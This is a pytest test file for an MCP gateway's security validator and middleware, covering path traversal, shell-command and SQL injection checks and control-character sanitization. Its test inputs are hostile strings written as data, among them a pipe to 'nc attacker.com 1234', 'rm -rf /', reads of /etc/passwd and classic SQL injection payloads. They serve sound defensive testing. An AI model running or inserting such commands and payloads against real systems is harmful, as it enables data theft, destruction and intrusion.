# -*- coding: utf-8 -*-
"""Tests for security validation middleware.

This module tests the gateway-level input validation and output sanitization
features that protect against:
- Path traversal attacks
- Command injection
- SQL injection
- XSS attacks
- Control character injection
"""

import pytest
from unittest.mock import MagicMock, patch

from mcpgateway.common.validators import SecurityValidator
from mcpgateway.middleware.validation_middleware import ValidationMiddleware


class TestSecurityValidator:
    """Test security validation functions."""

    def test_validate_shell_parameter_safe(self):
        """Test safe shell parameter validation."""
        result = SecurityValidator.validate_shell_parameter("safe_filename.txt")
        assert result == "safe_filename.txt"

    def test_validate_shell_parameter_dangerous_strict(self):
        """Test dangerous shell parameter in strict mode."""
        with patch('mcpgateway.common.validators.settings') as mock_settings:
            mock_settings.validation_strict = True
            with pytest.raises(ValueError, match="shell metacharacters"):
                SecurityValidator.validate_shell_parameter("file; cat /etc/passwd")

    def test_validate_shell_parameter_dangerous_non_strict(self):
        """Test dangerous shell parameter in non-strict mode."""
        with patch('mcpgateway.common.validators.settings') as mock_settings:
            mock_settings.validation_strict = False
            result = SecurityValidator.validate_shell_parameter("file; cat /etc/passwd")
            assert "'" in result  # Should be quoted

    def test_validate_path_safe(self):
        """Test safe path validation."""
        result = SecurityValidator.validate_path("/srv/data/file.txt", ["/srv/data"])
        assert result.endswith("file.txt")

    def test_validate_path_traversal(self):
        """Test path traversal detection."""
        with pytest.raises(ValueError, match="Path traversal"):
            SecurityValidator.validate_path("../../../etc/passwd")

    def test_validate_path_outside_root(self):
        """Test path outside allowed roots."""
        with pytest.raises(ValueError, match="outside allowed roots"):
            SecurityValidator.validate_path("/etc/passwd", ["/srv/data"])

    def test_validate_parameter_length(self):
        """Test parameter length validation."""
        with pytest.raises(ValueError, match="exceeds maximum length"):
            SecurityValidator.validate_parameter_length("this_is_too_long", max_length=10)

    def test_validate_sql_parameter_safe(self):
        """Test safe SQL parameter."""
        result = SecurityValidator.validate_sql_parameter("safe_value")
        assert result == "safe_value"

    def test_validate_sql_parameter_dangerous_strict(self):
        """Test dangerous SQL parameter in strict mode."""
        with patch('mcpgateway.common.validators.config_settings') as mock_settings:
            mock_settings.validation_strict = True
            with pytest.raises(ValueError, match="SQL injection"):
                SecurityValidator.validate_sql_parameter("'; DROP TABLE users; --")

    def test_validate_path_uri_schemes(self):
        """Test path validation skips URI schemes."""
        # HTTP URIs should pass through
        result = SecurityValidator.validate_path("http://example.com/file")
        assert result == "http://example.com/file"

        # Plugin URIs should pass through
        result = SecurityValidator.validate_path("plugin://my-plugin/resource")
        assert result == "plugin://my-plugin/resource"

    def test_validate_path_depth_limit(self):
        """Test path depth validation."""
        # This test requires mocking settings.max_path_depth
        with patch('mcpgateway.config.settings') as mock_settings:
            mock_settings.max_path_depth = 3
            # Deep path should be rejected by middleware
            # (actual implementation in ValidationMiddleware.validate_resource_path)

    def test_allowed_roots_configuration(self):
        """Test allowed roots configuration."""
        # Test with allowed roots
        result = SecurityValidator.validate_path("/srv/data/file.txt", ["/srv/data"])
        assert "/srv/data" in result

        # Test rejection outside allowed roots
        with pytest.raises(ValueError, match="outside allowed roots"):
            SecurityValidator.validate_path("/tmp/file.txt", ["/srv/data"])


class TestOutputSanitizer:
    """Test output sanitization functions."""

    def test_sanitize_text_clean(self):
        """Test sanitizing clean text."""
        result = SecurityValidator.sanitize_text("Hello World")
        assert result == "Hello World"

    def test_sanitize_text_control_chars(self):
        """Test sanitizing text with control characters."""
        result = SecurityValidator.sanitize_text("Hello\x1b[31mWorld\x00")
        assert result == "HelloWorld"

    def test_sanitize_text_preserve_newlines(self):
        """Test preserving newlines and tabs."""
        result = SecurityValidator.sanitize_text("Hello\nWorld\tTest")
        assert result == "Hello\nWorld\tTest"

    def test_sanitize_json_response_nested(self):
        """Test sanitizing nested JSON response."""
        data = {
            "message": "Hello\x1bWorld",
            "items": ["test\x00", "clean"],
            "nested": {"value": "bad\x1f"}
        }
        result = SecurityValidator.sanitize_json_response(data)
        assert result["message"] == "HelloWorld"
        assert result["items"][0] == "test"
        assert result["nested"]["value"] == "bad"

    def test_sanitize_mime_type_verification(self):
        """Test MIME type verification in responses."""
        # Test valid MIME types
        assert SecurityValidator.validate_mime_type("text/plain") == "text/plain"
        assert SecurityValidator.validate_mime_type("application/json") == "application/json"

        # Test invalid MIME types
        with pytest.raises(ValueError, match="Invalid MIME type"):
            SecurityValidator.validate_mime_type("invalid")

    def test_sanitize_escape_sequences(self):
        """Test removal of terminal escape sequences."""
        # Test various ANSI escape sequences
        result = SecurityValidator.sanitize_text("\x1b[0m\x1b[1;31mText\x1b[0m")
        assert "\x1b" not in result
        assert result == "Text"

        # Test cursor movement sequences
        result = SecurityValidator.sanitize_text("Hello\x1b[2JWorld")
        assert result == "HelloWorld"


class TestValidationMiddleware:
    """Test validation middleware."""

    def test_middleware_creation(self):
        """Test middleware can be created."""
        app = MagicMock()
        middleware = ValidationMiddleware(app)
        assert middleware is not None

    @pytest.mark.asyncio
    async def test_middleware_disabled(self):
        """Test middleware bypasses when disabled."""
        from unittest.mock import AsyncMock
        app = MagicMock()
        middleware = ValidationMiddleware(app)
        middleware.enabled = False

        request = MagicMock()
        call_next = AsyncMock(return_value="response")

        result = await middleware.dispatch(request, call_next)
        assert result == "response"
        call_next.assert_called_once()

    @pytest.mark.asyncio
    async def test_path_traversal_detection(self):
        """Test path traversal detection."""
        app = MagicMock()
        middleware = ValidationMiddleware(app)

        # Test path traversal patterns
        with pytest.raises(Exception, match="Path traversal"):
            middleware.validate_resource_path("../../../etc/passwd")

        with pytest.raises(Exception, match="Path traversal"):
            middleware.validate_resource_path("/srv/data/../../secret.txt")

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self):
        """Test command injection prevention."""
        # Test dangerous shell metacharacters
        with patch('mcpgateway.common.validators.settings') as mock_settings:
            mock_settings.validation_strict = True
            with pytest.raises(ValueError, match="shell metacharacters"):
                SecurityValidator.validate_shell_parameter("file.jpg; cat /etc/passwd")

            with pytest.raises(ValueError, match="shell metacharacters"):
                SecurityValidator.validate_shell_parameter("file.jpg && rm -rf /")

            with pytest.raises(ValueError, match="shell metacharacters"):
                SecurityValidator.validate_shell_parameter("file.jpg | nc attacker.com 1234")

    @pytest.mark.asyncio
    async def test_output_sanitization(self):
        """Test output sanitization removes control characters."""
        # Test control character removal
        result = SecurityValidator.sanitize_text("Hello\x1b[31mWorld\x00")
        assert result == "HelloWorld"

        # Test ANSI escape sequence removal
        result = SecurityValidator.sanitize_text("\x1b[1;31mRed Text\x1b[0m")
        assert result == "Red Text"

        # Test preserving newlines and tabs
        result = SecurityValidator.sanitize_text("Line1\nLine2\tTab")
        assert result == "Line1\nLine2\tTab"

    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self):
        """Test SQL injection prevention."""
        with patch('mcpgateway.common.validators.config_settings') as mock_settings:
            mock_settings.validation_strict = True

            # Test SQL injection patterns
            with pytest.raises(ValueError, match="SQL injection"):
                SecurityValidator.validate_sql_parameter("'; DROP TABLE users; --")

            with pytest.raises(ValueError, match="SQL injection"):
                SecurityValidator.validate_sql_parameter("1' OR '1'='1")

            with pytest.raises(ValueError, match="SQL injection"):
                SecurityValidator.validate_sql_parameter("admin'--")
